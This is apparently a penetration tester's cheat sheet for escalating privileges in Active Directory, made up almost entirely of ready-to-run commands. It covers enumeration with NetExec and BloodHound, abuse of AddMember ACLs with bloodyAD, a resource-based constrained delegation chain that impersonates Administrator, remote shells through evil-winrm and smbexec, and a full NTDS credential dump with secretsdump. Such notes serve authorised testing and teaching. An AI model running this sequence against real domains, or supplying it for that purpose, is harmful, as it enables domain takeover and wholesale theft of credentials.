# Active Directory

Collection → graph analysis → ACL abuse, the standard AD escalation loop once you have one domain credential.

```bash
nxc smb <DC_IP> -u <USER> -p '<PASS>'
nxc smb <DC_IP> -u <USER> -p '<PASS>' --generate-hosts-file hosts
# /etc/hosts: <DC_IP>  <DC_FQDN> <domain> <DC_SHORTNAME>

bloodhound-ce.py -u '<USER>' -p '<PASS>' -d <domain> -dc <DC_FQDN> -ns <DC_IP> -c All --zip

# if BloodHound shows you have AddMember on a privileged-nested group:
bloodyAD --host <DC_FQDN> -d <domain> -u <USER> -p '<PASS>' add groupMember '<GROUP>' <USER>

nxc smb <DC_IP> -u <USER> -p '<PASS>'        # re-check — should now show Pwn3d / admin
evil-winrm -i <DC_FQDN> -u <USER> -p '<PASS>'
```

RBCD via a self-created machine account (works if `MachineAccountQuota` lets you create one):

```bash
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass '<PW>' \
  -dc-host <DC_SHORTNAME> -domain-netbios <domain> '<domain>/<USER>:<PASS>'

rbcd.py -dc-ip <DC_IP> -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to '<DC_SHORTNAME>$' -action 'write' '<domain>/<USER>:<PASS>'

getST.py -spn 'cifs/<DC_FQDN>' -impersonate 'Administrator' \
  '<domain>/ATTACKERSYSTEM$:<PW>'

export KRB5CCNAME=Administrator@cifs_<DC_FQDN>@<REALM>.ccache
smbexec.py -k -no-pass <domain>/Administrator@<DC_FQDN>
secretsdump.py -k -no-pass <domain>/Administrator@<DC_FQDN>   # full NTDS dump
```

